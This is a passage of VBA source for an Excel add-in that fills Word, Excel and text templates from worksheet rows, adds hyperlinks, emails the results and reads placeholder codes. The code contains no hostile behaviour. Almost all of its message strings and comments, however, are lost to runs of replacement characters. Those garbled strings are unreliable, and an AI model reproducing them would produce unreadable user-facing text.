            MsgBox msg$, vbCritical, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Microsoft Word"
            Exit Sub
        End If
        WA.Visible = False
    End If

    Main_PI.StartNewAction 4, 6, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ..."        ', , , rc&
    If PIBL Then Exit Sub

    Dim options As Dictionary, FilesCreated&, FilesFailed&, KeysRange As Range, HLcell As Range, Blocks As Collection
    Set KeysRange = SpecialCells_TypeConstants(ActiveSheet.Rows(HEADER_ROW))

    If KeysRange Is Nothing Then
        Main_PI.Hide
        Application.ScreenUpdating = True
        MsgBox "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|!" & vbNewLine & _
               "(|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| " & HEADER_ROW & ")" & vbNewLine & vbNewLine & _
               "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", _
               vbExclamation, "|fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        ShowSettingsPage
        F_Settings.MultiPage_Options.Value = 2
        F_Settings.Label_HeaderRow.Font.Bold = True: F_Settings.Label_HeaderRow.ForeColor = vbRed
        Exit Sub
    End If

    Dim LS As New Letters, Lett As Letter, MULTIROW_MODE As Boolean, pi_msg$
    Dim TemplatesFilenamesForRow As Collection, HL_text$
    MULTIROW_MODE = SETT.GetBoolean("CheckBox_MultiRow")

    If MULTIROW_MODE Then        ' |fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
        Set Blocks = CollectionOfRowsBlocks(ra)
        If Blocks.Count = 0 Then GoTo EndFor
        rc& = Blocks.Count
    End If

    Main_PI.StartNewAction 6, , "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ...", , , rc&
    Application.ScreenUpdating = False

    HL_text$ = SETT.GetText("TextBox_HyperlinkText")

    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
    For Each ro In IIf(MULTIROW_MODE, Blocks, ra.Rows)

        If MULTIROW_MODE Then        ' |fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
            Main_PI.SubAction , "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|"
            Set options = ReadMultirowOptions(ro.EntireRow)
            pi_msg$ = "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| " & ro.Address & " |fffd||fffd||fffd||fffd||fffd||fffd||fffd| Excel"

        Else        ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|)
            Main_PI.SubAction , "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| $index |fffd||fffd| $count", "$time"
            Set options = ReadOptions(ro)
            pi_msg$ = "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| " & ro.Row & " |fffd||fffd||fffd||fffd||fffd||fffd||fffd| Excel"
        End If

        Set Lett = LS.CreateNewLetter: Lett.Render options: Set Lett.SourceRow = ro

        Set TemplatesFilenamesForRow = New Collection
        Set TemplatesFilenamesForRow = ApplyTemplatesFilter(TemplatesFilenames, ro)

        If TemplatesFilenames.Count Then
            Main_PI.Log "": Main_PI.Log "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & pi_msg$
        Else
            If SEND_MAIL_MODE Then Main_PI.Log vbTab & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd|: " & Lett.Email
        End If

        Set pi2 = Main_PI.AddChildIndicator("|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & pi_msg$)
        pi2.StartNewAction , , , , , TemplatesFilenamesForRow.Count + sss

        If SETT.GetBoolean("CheckBox_TemplatesFilter_Enabled") Then
            ' If TemplatesFilenamesForRow.Count < TemplatesFilenames.Count Then
            Main_PI.Log "  |fffd||fffd||fffd||fffd||fffd||368||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|  " & _
                        TemplatesFilenamesForRow.Count & " |fffd||fffd| " & TemplatesFilenames.Count
        End If

        Dim i&, NewFilename$, commonFilename$

        For i = 1 To TemplatesFilenamesForRow.Count        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|

            template$ = TemplatesFilenamesForRow(i): Err.Clear
            pi2.SubAction "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| $index |fffd||fffd| $count"

            Main_PI.Log vbTab & String(40, "=")
            Main_PI.Log vbTab & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & i & " |fffd||fffd| " & TemplatesFilenamesForRow.Count
            Main_PI.Log vbTab & "|fffd||fffd||fffd||fffd||fffd||fffd|: " & Replace(template$, TEMPLATES_FOLDER$, "...\")


            NewFilename$ = "": NewFilename$ = CreatePathForFile(template$, options)
            res = CreateAndFillDocument(template$, options, pi2)

            Main_PI.Log vbTab & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & IIf(res, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd||fffd|")
            If Err <> 0 Then Main_PI.Log "|fffd||fffd||fffd||fffd||fffd||fffd| " & Err.Number & vbTab & Err.Description
            If SEND_MAIL_MODE Then Main_PI.Log vbTab & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd|: " & Lett.Email

            If SETT.GetBoolean("CheckBox_Mail_AttachCreatedFiles") Then _
               Lett.AddAttachment NewFilename$, RenderString(SETT.GetText("TextBox_AttachCreatedFilesMask"), options)

            If res And SETT.GetBoolean("CheckBox_AddHyperlinks") Then        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                Set HLcell = Nothing
                Set HLcell = Intersect(Get_HLink_Column(template$, KeysRange), ro)
               HLcell.Hyperlinks.Add HLcell, NewFilename$, , "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|" & vbLf & Dir(NewFilename$), HL_text$
            End If
            Err.Clear

            FilesCreated& = FilesCreated& - res
            FilesFailed& = FilesFailed& - (Not res)
            If PL_(msg) Then
                msg$ = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
                pi2.Hide: Main_PI.Log msg: GoTo EndFor
            End If
            If StopMacro Then
                msg$ = vbNewLine & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
                pi2.Hide: Main_PI.Log msg: GoTo EndFor
            End If
        Next i
        pi2.Hide
        If TemplatesFilenamesForRow.Count Then Main_PI.Log vbTab & String(40, "=")
    Next ro
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|

    If SETT.GetBoolean("CheckBox_CombineXLSsheets") Then
        If Not PRINT_TO_PDF Then
            If CombineXLScollection.Count Then
                Main_PI.StartNewAction 98, 100, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| Excel |fffd| |fffd||fffd||fffd||fffd| ..."
                commonFilename$ = CombineXLSsheets(CombineXLScollection)
                If Len(commonFilename$) Then
                    Main_PI.Log "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| Excel |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd|" & vbNewLine & commonFilename$
                End If
            End If
        End If
    End If

EndFor:
    Application.DisplayAlerts = False
    For Each item In ExcelTablesToBeClosed
        Workbooks(CStr(item)).Close False
    Next
    Application.DisplayAlerts = True
    Application.ScreenUpdating = True

    Dim SendErr$
    If SEND_MAIL_MODE Then
        res = LS.SendAll(SendErr$)
        If Len(SendErr$) Then
            Main_PI.Log vbTab: Main_PI.Log vbTab & SendErr$
        Else
            Main_PI.Log vbTab: Main_PI.Log vbTab & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|: " & IIf(res, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd||fffd|")
        End If
    End If

    If Not WordAlreadyOpen Then
        WA.Quit        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Word, |fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    Else
        WA.Visible = True
    End If
    Set WA = Nothing

    AppActivate Application.Name
    Main_PI.StartNewAction 100, 100, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", _
                           "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|: " & FilesCreated & " |fffd||fffd| " & FilesCreated + FilesFailed&, _
                           "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & IIf(SETT.GetBoolean("CheckBox_Multirow_GroupRows"), "|fffd||fffd||fffd||fffd||fffd||fffd| ", "") & "|fffd||fffd||fffd||fffd||fffd|: " & rc& & _
                           ", |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & TemplatesFilenames.Count
    Main_PI.FP.SpinButton_log.Visible = False
    Main_PI.CancelButton.Caption = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd|"

    If TemplatesFilenames.Count = 0 And SEND_MAIL_MODE = True Then
        Main_PI.Line1 = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        Main_PI.Line2 = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|: " & LS.Items.Count
    Else
        Main_PI.Log "": Main_PI.Log "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|:"
        Main_PI.Log vbTab & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & TemplatesFilenames.Count
        Main_PI.Log vbTab & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| Excel: " & rc&
        Main_PI.Log vbTab & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|: " & FilesCreated & IIf(SETT.GetBoolean("CheckBox_MultiRow"), " (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd|MULTIROW|fffd|)", "")
        If FilesFailed& Then Main_PI.Log vbTab & "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|: " & FilesFailed&
    End If


    StopMacro = True
    Main_PI.Log vbNewLine

    Set ThisWorkbook.app = Application

    Main_PI.CancelButton.Width = 0
    If FilesCreated > 0 Then
        If SETT.GetBoolean("CheckBox_ShowFolderWhenDone") Then
            OpenFolder OUTPUT_FOLDER$
        Else
            Main_PI.AddButton "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "OpenDestinationFolder"
        End If
    End If

    If SETT.GetBoolean("CheckBox_CloseProgressBar") Then Main_PI.Hide
End Sub


Function Get_HLink_Column(ByVal filename$, ByRef KeysRange As Range) As Range
    On Error Resume Next: Err.Clear: Dim celltext$
    celltext$ = HYPERLINK_START$ & Dir(filename$, vbNormal)
    If celltext$ Like "*.*" Then celltext$ = Left(celltext$, InStrRev(celltext$, ".") - 1)

    Set Get_HLink_Column = KeysRange.Find(celltext$, , xlValues, xlPart).EntireColumn
End Function


Sub OpenDestinationFolder()
    On Error Resume Next: OpenFolder OUTPUT_FOLDER$
End Sub

Function CreateAndFillDocument(ByVal TemplateFilename$, ByRef options As Dictionary, _
                               Optional ByRef pi As ProgressIndicator) As Boolean
    On Error Resume Next
    Dim NewFilename$, ttype$
    options("{%pcc%}") = "": options("{%pdf%}") = 0
    NewFilename$ = CreatePathForFile(TemplateFilename$, options)

    ttype$ = TemplateType(TemplateFilename$)
    Select Case True
        Case ttype$ Like "XLS*"
            CreateAndFillDocument = CreateAndFill_XLS(TemplateFilename$, NewFilename$, options, pi)
            If CreateAndFillDocument Then CombineXLScollection.Add NewFilename$
        Case ttype$ Like "DOC*"
            CreateAndFillDocument = CreateAndFill_DOC(TemplateFilename$, NewFilename$, options, pi)
        Case ttype$ Like "TXT"
            CreateAndFillDocument = CreateAndFill_TXT(TemplateFilename$, NewFilename$, options, pi)
        Case Else:
            CreateAndFillDocument = False
    End Select
End Function


Function ApplyTemplatesFilter(ByRef coll As Collection, ByRef ro As Range) As Collection
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| coll |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    ' (|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|)
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    On Error Resume Next
    Set ApplyTemplatesFilter = coll
    If Not SETT.GetBoolean("CheckBox_TemplatesFilter_Enabled") Then Exit Function

    Dim col&, ra As Range, cell As Range, list$, item As Variant, filename$, OK As Boolean, mask
    col& = SETT.GetNumber("ComboBox_TemplatesFilter_Column")
    If col = 0 Then Exit Function

    ' |fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| Multirow) |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|:   |fffd||fffd||fffd|.doc    |fffd||fffd||fffd|    |fffd||fffd||fffd| *.doc*/|fffd||fffd||fffd||fffd||fffd||fffd||fffd|.doc/*.xls
    Set ra = Intersect(ro.EntireRow, ro.Worksheet.Columns(col&))
    list$ = "/"
    For Each cell In ra.Cells
        list$ = list$ & Trim(cell.Value) & "/"
    Next cell

    list$ = Replace(list$, "\", "/")
    While InStr(1, list$, "/ ") > 0: list$ = Replace(list$, "/ ", "/"): Wend
    While InStr(1, list$, " /") > 0: list$ = Replace(list$, " /", "/"): Wend
    While InStr(1, list$, "//") > 0: list$ = Replace(list$, "//", "/"): Wend

    Set ApplyTemplatesFilter = New Collection
    For Each item In coll        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        filename$ = "": filename$ = Dir(item, vbNormal)
        OK = False
        For Each mask In Split(list$, "/")        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
            If filename$ Like mask Then OK = True: Exit For
        Next
        If OK Then ApplyTemplatesFilter.Add item
    Next
End Function
Attribute VB_Name = "mod_FieldCodes"
'---------------------------------------------------------------------------------------
' Module        : mod_FieldCodes
' Author        : EducatedFool                     Date: 26.04.2015
' Professional application development for Microsoft Excel
' http://ExcelVBA.ru/          ICQ: 5836318           Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Explicit
Option Compare Text
Option Private Module

Function GetTemplateOptions(ByRef AllOptions As Dictionary, ByRef TemplateFieldCodes As Collection) As Dictionary
    On Error Resume Next
    Set GetTemplateOptions = New Dictionary
    AllOptions.CompareMode = 1        ' TextCompare

    Dim code, key_mask$, key$, AllOptionsKeys As Variant, i&, found As Boolean, OK As Boolean, AbsentCodes$, txt$
    AllOptionsKeys = AllOptions.keys
    'If SourceSheet Is Nothing Then Set SourceSheet = ActiveSheet        ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|

    For Each code In TemplateFieldCodes
        key_mask$ = "{" & Replace(code, "#", "[#]#*") & "}*"

        found = False
        For i = LBound(AllOptionsKeys) To UBound(AllOptionsKeys)
            key$ = AllOptionsKeys(i)
            If key$ Like key_mask$ Then
                GetTemplateOptions.Add key$, AllOptions.item(key$)
                found = True
            End If
        Next i

        If Not found Then
            OK = False: key$ = "{" & code & "}"
            If code Like "=*" Then        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                Err.Clear: txt$ = "": txt$ = SourceSheet.Range(Mid(code, 2)).Text
                OK = Err = 0
                AddLongTextIntoDictionary txt$, key$, GetTemplateOptions
            End If
            If Not OK Then If Not key$ Like "{%*%}" Then AbsentCodes$ = AbsentCodes$ & ", " & key$
        End If
    Next

    If Len(AbsentCodes$) Then
        Main_PI.Log vbTab & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|! |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & Mid(AbsentCodes$, 3)
        Main_PI.Repaint
    End If

    '    For i = LBound(AllOptionsKeys) To UBound(AllOptionsKeys)
    '        key$ = AllOptionsKeys(i)
    '        If key$ Like "{%*%}" Then         ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
    '            If Not GetTemplateOptions.Exists(key$) Then GetTemplateOptions.Add key$, AllOptions.item(key$)
    '        End If
    '    Next i
End Function

Sub AddLongTextIntoDictionary(ByVal txt$, ByVal key$, ByRef options As Dictionary)
    On Error Resume Next
    Dim i&, baseKey$, newkey$, LenStep&, txt_part$

    If Len(txt$) < 152 Then        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| - 255 |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        options.Add key$, txt$
        Exit Sub
    End If

    LenStep& = 250 - Len(key$) - 12        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|:) |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|!
    baseKey$ = key$
    For i = 1 To Len(txt$) Step LenStep&
        txt_part$ = Mid(txt$, i, LenStep&)
        newkey$ = baseKey$ & "{l=" & i & "}"
        If i + LenStep& - 1 < Len(txt$) Then txt_part$ = txt_part$ & newkey$
        options.Add key$, txt_part$
        key$ = newkey$
    Next i
End Sub

Function ReadOptions(ByRef ro As Range) As Dictionary
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    Set ReadOptions = New Dictionary
    Dim cell As Range, i&, KeysRange As Range, key$, baseKey$, newkey$, txt$, LenStep&, wbname$, txt_part$

    On Error Resume Next
    Set KeysRange = SpecialCells_TypeConstants(ro.Worksheet.Rows(HEADER_ROW))
    If Not KeysRange Is Nothing Then
        For Each cell In KeysRange.Cells
            key$ = Trim(cell)
            If Len(key$) > 250 Then key$ = Left(key$, 250)
            If Not key$ Like "*}" Then key$ = key$ & "}"
            If Not key$ Like "{*" Then key$ = "{" & key$
            txt$ = Intersect(ro.EntireRow, cell.EntireColumn).Text
            If cell.EntireColumn.Hidden Then txt$ = Intersect(ro.EntireRow, cell.EntireColumn).Value

            AddLongTextIntoDictionary txt$, key$, ReadOptions
        Next cell
    End If

    AddNamedRangesIntoDictionary ReadOptions, ro.Worksheet.Parent

    ReadOptions.Add "{%str%}", ro.Row
    ReadOptions.Add "{%date%}", Format(Now, "YYYY-MM-DD")
    ReadOptions.Add "{%shortdate%}", Format(Now, "YYMMDD")

    ReadOptions.Add "{%longdate%}", Format(Now, "DD MMMM YYYY")
    ReadOptions.Add "{%time%}", Format(Now, "HH-NN-SS")
    ReadOptions.Add "{%shorttime%}", Format(Now, "HHNNSS")

    ReadOptions.Add "{%datetime%}", Format(Now, "YYYY-MM-DD HH-NN-SS")
    ReadOptions.Add "{%shortdatetime%}", Format(Now, "YYMMDD-HHNNSS")
    ReadOptions.Add "{%longdatetime%}", Format(Now, "DD MMMM YYYY HH-NN-SS")

    ReadOptions.Add "{%sheet_name%}", ro.Worksheet.Name
    ReadOptions.Add "{%sheet_index%}", ro.Worksheet.index
    wbname$ = ro.Worksheet.Parent.Name: If wbname$ Like "*.*" Then wbname$ = Left(wbname$, InStrRev(wbname$, ".") - 1)
    ReadOptions.Add "{%workbook_name%}", wbname$
End Function

Sub AddNamedRangesIntoDictionary(ByRef dict As Dictionary, ByRef WB As Workbook)
    On Error Resume Next
